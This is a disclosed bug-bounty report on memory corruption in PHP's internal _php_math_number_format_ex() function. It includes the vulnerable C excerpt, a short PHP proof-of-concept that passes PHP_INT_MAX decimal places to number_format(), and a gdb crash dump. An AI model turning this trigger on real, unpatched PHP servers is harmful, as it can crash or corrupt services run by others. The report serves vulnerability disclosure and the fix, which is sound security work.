# Memory corruption due to missing check size in _php_math_number_format_ex()

## Report Details
- **Report ID**: 180572
- **URL**: https://hackerone.com/reports/180572
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-11-07T04:07:08.680Z
- **Disclosed**: 2019-11-12T09:21:58.283Z

## Reporter
- **Username**: fosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73424
Description:
------------
I have found some vulnerable code at ```_php_math_number_format_ex()``` function. ```_php_math_number_format_ex()``` function is an internal function which is called from ```number_format()``` function. ```number_format()``` function takes in a number and uses it as the number of decimal points. If the number of decimal points is huge, it may lead to memory corruption.

``` c
PHPAPI zend_string *_php_math_number_format_ex(double d, int dec, char *dec_point,
		size_t dec_point_len, char *thousand_sep, size_t thousand_sep_len)
{
....
    /* copy the decimal places.
	 * Take care, as the sprintf implementation may return less places than
	 * we requested due to internal buffer limitations */
	if (dec) {
		int declen = (int)(dp ? s - dp : 0);
		int topad = dec > declen ? dec - declen : 0;

		/* pad with '0's */
		while (topad--) {
			*t-- = '0';
        }
....
    }
}
```

Test script:
---------------
``` php
<?php
ini_set('memory_limit', -1);
number_format(1.337E+308, PHP_INT_MAX, "BBBBBBBBB", str_repeat("A", 0x0160b60c));
?>
```
Actual result:
--------------
```
 [----------------------------------registers-----------------------------------]
EAX: 0x737774ab
EBX: 0xb7867283 --> 0x30 ('0')
ECX: 0x35c88b54
EDX: 0xb5c88a14 --> 0x30 ('0')
ESI: 0xb7867145 (".", '0' <repeats 199 times>...)
EDI: 0x7ffffec1
EBP: 0xb7867010 ("1337", '0' <repeats 13 times>, "977059649492062330579754870427181437339291312645302506433696319272398884101913791272347002725778172418503727508120535851302028850301527089221876489630532016587850114320486631775390034"...)
ESP: 0xbfffbf00 --> 0x0
EIP: 0x8279538 (<_php_math_number_format_ex+776>:       mov    BYTE PTR [ecx+eax*1],0x30)
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8279531 <_php_math_number_format_ex+769>:  sub    ecx,edi
   0x8279533 <_php_math_number_format_ex+771>:  nop
   0x8279534 <_php_math_number_format_ex+772>:  lea    esi,[esi+eiz*1+0x0]
=> 0x8279538 <_php_math_number_format_ex+776>:  mov    BYTE PTR [ecx+eax*1],0x30
   0x827953c <_php_math_number_format_ex+780>:  sub    eax,0x1
   0x827953f <_php_math_number_format_ex+783>:  cmp    eax,0xffffffff
   0x8279542 <_php_math_number_format_ex+786>:  jne    0x8279538 <_php_math_number_format_ex+776>
   0x8279544 <_php_math_number_format_ex+788>:  sub    edx,edi
[------------------------------------stack-------------------------------------]
0000| 0xbfffbf00 --> 0x0
0004| 0xbfffbf04 --> 0x87f5103 ("%.*F")
0008| 0xbfffbf08 --> 0x7fffffff
0012| 0xbfffbf0c --> 0xd28a58c8
0016| 0xbfffbf10 --> 0x7fe7cca4
0020| 0xbfffbf14 --> 0xb785f134 --> 0x836d410 (<ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER>:        push   ebp)
0024| 0xbfffbf18 --> 0xb7867000 --> 0x1
0028| 0xbfffbf1c --> 0xc888a05
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
_php_math_number_format_ex (d=<optimized out>, dec=0x7fffffff, dec_point=0xb7803450 "BBBBBBBBB", dec_point_len=0x9, thousand_sep=0xb5e00010 'A' <repeats 200 times>..., thousand_sep_len=0x160b60c)
    at /home/skynet/PHP-7.1/ext/standard/math.c:1190
1190                            *t-- = '0';
gdb-peda$ bt
#0  _php_math_number_format_ex (d=<optimized out>, dec=0x7fffffff, dec_point=0xb7803450 "BBBBBBBBB", dec_point_len=0x9, thousand_sep=0xb5e00010 'A' <repeats 200 times>..., thousand_sep_len=0x160b60c)
    at /home/skynet/PHP-7.1/ext/standard/math.c:1190
#1  0x082797db in zif_number_format (execute_data=0xb7814080, return_value=0xbfffbfd0) at /home/skynet/PHP-7.1/ext/standard/math.c:1264
#2  0x0836d576 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER () at /home/skynet/PHP-7.1/Zend/zend_vm_execute.h:628
#3  0x0835e082 in execute_ex (ex=0xb7814020) at /home/skynet/PHP-7.1/Zend/zend_vm_execute.h:429
#4  0x083ad11b in zend_execute (op_array=op_array@entry=0xb7864180, return_value=return_value@entry=0x0) at /home/skynet/PHP-7.1/Zend/zend_vm_execute.h:474
#5  0x0831d8c0 in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /home/skynet/PHP-7.1/Zend/zend.c:1464
#6  0x082bf44b in php_execute_script (primary_file=primary_file@entry=0xbfffe2b8) at /home/skynet/PHP-7.1/main/main.c:2533
#7  0x083af46a in do_cli (argc=argc@entry=0x3, argv=argv@entry=0x88c5a88) at /home/skynet/PHP-7.1/sapi/cli/php_cli.c:990
#8  0x0806d484 in main (argc=0x3, argv=0x88c5a88) at /home/skynet/PHP-7.1/sapi/cli/php_cli.c:1378
#9  0xb7c08943 in __libc_start_main (main=0x806cfb0 <main>, argc=0x3, ubp_av=0xbffff564, init=0x83b6fc0 <__libc_csu_init>, fini=0x83b7030 <__libc_csu_fini>, rtld_fini=0xb7fee700 <_dl_fini>,
    stack_end=0xbffff55c) at libc-start.c:274
#10 0x0806d511 in _start ()
gdb-peda$
```

## Attachments
No attachments
